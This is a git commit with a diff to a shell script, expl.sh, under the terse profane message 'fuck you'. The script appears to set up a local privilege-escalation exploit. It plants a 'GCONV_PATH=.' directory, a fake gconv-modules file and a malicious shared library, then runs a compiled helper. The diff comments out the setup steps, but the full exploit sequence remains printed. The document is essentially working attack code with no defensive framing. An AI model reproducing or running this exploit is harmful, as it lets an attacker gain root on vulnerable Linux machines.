79447a8ac7ac0cacc750fca003a71ee222d4ae8e
Rektedekte <olivervosswinkler@gmail.com>
2022-04-24 08:50:18 -0400

    fuck you

--- expl.sh
+++ expl.sh
@@ -1,6 +1,6 @@
 #!/bin/sh
 
-set -e
+# set -e
 
 # Setup:
 # .
@@ -10,17 +10,17 @@ set -e
 #     ├── gconv-modules
 #     └── fake_module.so
 
-mkdir -p 'GCONV_PATH=.'
-touch 'GCONV_PATH=./fake_exe'
-chmod +x 'GCONV_PATH=./fake_exe'
+# mkdir -p 'GCONV_PATH=.'
+# touch 'GCONV_PATH=./fake_exe'
+# chmod +x 'GCONV_PATH=./fake_exe'
 
-mkdir -p fake_exe
-echo 'module INTERNAL banana// fake_module 1' > fake_exe/gconv-modules
+# mkdir -p fake_exe
+# echo 'module INTERNAL banana// fake_module 1' > fake_exe/gconv-modules
 
-gcc -o helper helper.c
-gcc -fPIC -shared -o fake_exe/fake_module.so fake_module.c
+# gcc -o helper helper.c
+# gcc -fPIC -shared -o fake_exe/fake_module.so fake_module.c
 
-set +e
+# set +e
 env PATH="$(pwd):$PATH" ./helper
 
 rm -rf 'GCONV_PATH=.' fake_exe helper
